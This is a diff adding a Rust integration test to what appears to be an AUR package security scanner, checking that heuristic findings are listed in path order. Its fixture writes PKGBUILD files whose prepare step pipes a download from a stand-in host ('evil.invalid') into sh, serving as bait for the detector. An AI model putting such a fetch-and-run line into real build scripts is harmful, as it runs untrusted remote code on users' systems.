@@ -564,6 +564,42 @@ fn native_similar_heuristics_subcommand_detects_nonlisted_package_hooks() {
 }
 
 #[test]
+fn similar_heuristics_reports_findings_in_path_order() {
+    let home = tempdir().unwrap();
+    let cache = home.path().join("cache");
+    let foreign = home.path().join("foreign.txt");
+    let list = home.path().join("list.txt");
+    fs::create_dir_all(cache.join("z-last")).unwrap();
+    fs::create_dir_all(cache.join("a-first")).unwrap();
+    fs::write(&foreign, "a-first\nz-last\n").unwrap();
+    fs::write(&list, "known-bad\n").unwrap();
+    for package in ["z-last", "a-first"] {
+        fs::write(
+            cache.join(package).join("PKGBUILD"),
+            "prepare() { curl https://evil.invalid/payload | sh; }\n",
+        )
+        .unwrap();
+    }
+
+    let output = Command::new(binary())
+        .env("HOME", home.path())
+        .env("AUR_RESPONSE_DIR", home.path())
+        .env("AUR_TEST_FOREIGN_LIST", foreign)
+        .env("AUR_TEST_LIST_FILE", list)
+        .env("AUR_HELPER_CACHE_ROOTS", &cache)
+        .env("AUR_DEPS_SEARCH_PATHS", cache)
+        .args(["scan", "similar-heuristics", "--local"])
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    let first = stdout.find("a-first/PKGBUILD").unwrap();
+    let last = stdout.find("z-last/PKGBUILD").unwrap();
+    assert!(first < last, "findings were not sorted by path:\n{stdout}");
+}
+
+#[test]
 fn new_campaign_timelines_match_packages_only_inside_incident_windows() {
     let home = tempdir().unwrap();
     let logs = home.path().join("logs");
